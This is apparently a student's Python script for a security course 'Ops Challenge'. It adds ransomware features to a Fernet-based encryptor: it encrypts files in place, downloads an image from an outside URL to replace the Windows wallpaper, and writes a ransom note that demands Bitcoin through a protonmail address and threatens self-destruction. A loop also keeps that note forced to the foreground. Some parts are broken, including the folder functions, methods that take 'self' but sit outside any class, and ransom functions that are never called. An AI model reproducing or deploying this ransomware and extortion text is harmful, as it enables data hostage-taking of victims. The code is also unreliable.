#!/usr/bin/env/python3
# the shebang line instructs the system to use the env command to locate the python3 
# interpreter and execute the script with it

# Script Name:                  Ops Challenge: 401-08opschallenge-FileEncryption3.py
# Author:                       Ben Hobbs
# Date of latest revision:      07/19/2023
# Purpose:                      Add a feature capability to your script to:
#                               Alter the desktop wallpaper on a Windows PC with a ransomware message
#                               Create a popup window on a Windows PC with a ransomware message
#
#                               
# References:
# 
# https://appdividend.com/2020/01/20/python-list-of-files-in-directory-and-subdirectories/

# Import Libraries
from cryptography.fernet import Fernet 
from os.path import exists
import os # to get system root
import ctypes # so we can interact with windows dlls and change 
# windows background etc
import urllib.request # used for downloading and saving background image
import time # used to time.sleep interval for ransom note & check 
# desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom note
import win32gui # used to get window text to see if ransom note 
# is on top of all other windows
import threading # used for ransom note and decryption key on desktop


# Declaration of variables (global)


# Declaration of functions

# Write a function to generate a key for encryption/decryption
def gen_key():

    # Generate a key.
    key = Fernet.generate_key()
    print(key)

    # Saving the generated key to a file for reuse.
    with open("key.key", "wb") as key_file:
        key_file.write(key)      

# Write a function to load up the generated key so we can encrypt and decrypt
def load_key():

    # Retreives the generated key from the key.key file.
    return open("key.key", "rb").read()
# Function to encrypt a message
def encrypt_message():
    f = Fernet(key)
    user_message = input("What is the message that you would like to encrypt?")
    encrypted_message = user_message.encode()
    
    # encrypt the message
    encrypted = f.encrypt(encrypted_message)
    print("Here is your encrypted message: ")
    print(encrypted)

# Function to decrypt a message
def decrypt_message():
    f = Fernet(key)
    user_message = input("What is the message that you would like to decrypt?")
    decrypted_message = user_message.encode()
    
    # decrypt the message
    decrypted = f.decrypt(decrypted_message)
    print("Here is your encrypted message: ")
    print(decrypted)

# Function to encrypt a file
def encrypt_file():
    f = Fernet(key)
    filename = input("What is the file that you would like to encrypt?")
    with open(filename, "rb") as file:
        file_data = file.read()
        encrypted_file = f.encrypt(file_data)
        # write the encrypted data to a file
        with open(filename, "wb") as file:
            file.write(encrypted_file)
    
# Function to decrypt a file
def decrypt_file():
    f = Fernet(key)
    filename = input("What is the file that you would like to decrypt?")
    with open(filename, "rb") as file:
        file_data = file.read()
        decrypted_file = f.decrypt(file_data)
        # write the decrypted data to a file
        with open(filename, "wb") as file:
            file.write(decrypted_file)

# Function to encrypt a folder (recursively)
def encrypt_folder(path, key):
    f = Fernet(key)
    path = input("What is the path to the folder that you would like to encrypt?")
    os.walk(path, topdown=True, onerror=None, followlinks=False)
    encrypted_folder = f.encrypt.encode(path)
    print(encrypted_folder)

# Function to decrypt a folder (recursively)
def decrypt_folder(path, key):
    f = Fernet(key)
    path = input("What is the path to the folder that you would like to decrypt?")
    os.walk(path, topdown=True, onerror=None, followlinks=False)
    decrypted_folder = f.decrypt.encode(path)
    print(decrypted_folder)

# Function to create a user menu for the above options
def select_option():
    mode = input("\nWhat would you like to do? Please choose an option. \n Mode 1 - Encrypt a file \n Mode 2 - Decrypt a file \n Mode 3 - Encypt a message \n Mode 4 - Decrypt a message \n Mode 5 - Encrypt a folder (and contents) \n Mode 6 - Decrypt a folder (and contents) \n Please enter a number: ")
    if (mode == "1"):
        encrypt_file()
        print("Your file is now encrypted")
    elif (mode == "2"):
        decrypt_file()
        print("Your file is now decrypted")
    elif (mode == "3"):
        encrypt_message()
        print("Your message is encrypted")
    elif (mode == "4"):
        print("Your message is decrypted")
    elif (mode == "5"):
        path = input("What is the path to the folder that you would like to encrypt?")
        encrypt_folder(path, key)
        print("Your folder and contents are now encrypted")
    elif (mode == "6"):
        path = input("What is the path to the folder that you would like to encrypt?")
        decrypt_folder(path, key)
        print("Your folder and contents are now decrypted")
    else:
        print("Invalid Selection, self-destruct sequence activated...")
        print("goodbye")


# Function to change background
def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
******ATTENTION VICTIMS, YOU HAVE BEEN PWNED*******
The contents of your computer have been encrypted with an Quantum Computing grade encryption algorithm.
You can only restore your data with a key that ONLY we control.
Only we can decrypt your files!
To buy back your key and restore your data, do this three easy steps EXACTLY. No FUNNY stuff or the data gets it!:
1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
2. You will receive your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
3. When we have verified payment, you will receive a text file with your KEY that will unlock all your files.
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
WARNING:
*********YOUR FILES HAVE NOT ONLY BEEN ENCRYPTED, THEY HAVE ALSO BEEN RIGGED TO SELF-DESTRUCT*********
Do NOT attempt to decrypt your files with any software as it is obsolete and will not work. Your price will triple.
Do NOT change ANYTHING- Or your price will triple, AND we will activate the self-destruct countdown.
Do NOT send "PAID" button without paying, price will increase by a factor of ten (10x).
Our threats are not idle. 
Do NOT test us
"How about a nice game of chess?"
Your move.
''')
def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                # Kill ransom note so we can open it again and make sure ransom note is in ForeGround (top of all windows)
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # sleep for 10 seconds
            time.sleep(10)
            count +=1
            if count == 5:
                break

# Main:

# Check to see if a key exists already
key_exists = exists("./key.key")
print(key_exists)

if key_exists:
    key = load_key()
    print("loaded existing key")
else:
    gen_key()
    key = load_key()
    print("generated new key")

select_option()


# End